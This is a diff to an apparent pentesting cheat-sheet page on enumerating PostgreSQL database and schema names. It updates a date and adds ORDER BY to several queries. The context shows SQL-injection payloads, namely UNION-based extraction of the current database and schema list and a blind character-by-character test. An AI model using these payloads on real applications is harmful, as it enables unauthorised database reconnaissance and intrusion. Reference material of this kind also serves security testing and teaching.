@@ -4,7 +4,7 @@ description: How to retrieve database names in PostgreSQL
 category: Information Gathering
 order: 6
 tags: ["databases", "enumeration", "reconnaissance"]
-lastUpdated: 2025-12-07
+lastUpdated: 2025-12-16
 ---
 
 ## Retrieving Database Names
@@ -44,7 +44,7 @@ SELECT datname FROM pg_database;
 SELECT datname FROM pg_database WHERE datistemplate = false;
 
 -- Get databases as comma-separated list
-SELECT string_agg(datname, ',') FROM pg_database;
+SELECT string_agg(datname, ',' ORDER BY datname) FROM pg_database;
 ```
 
 ### Database Information
@@ -85,7 +85,7 @@ AND nspname != 'information_schema';
 ' UNION SELECT NULL,current_database(),NULL--
 
 -- List all schemas
-' UNION SELECT NULL,string_agg(schema_name,','),NULL FROM information_schema.schemata--
+' UNION SELECT NULL,string_agg(schema_name,',' ORDER BY schema_name),NULL FROM information_schema.schemata--
 
 -- Blind injection (extract database name character by character)
 ' AND SUBSTRING(current_database(),1,1)='p'--
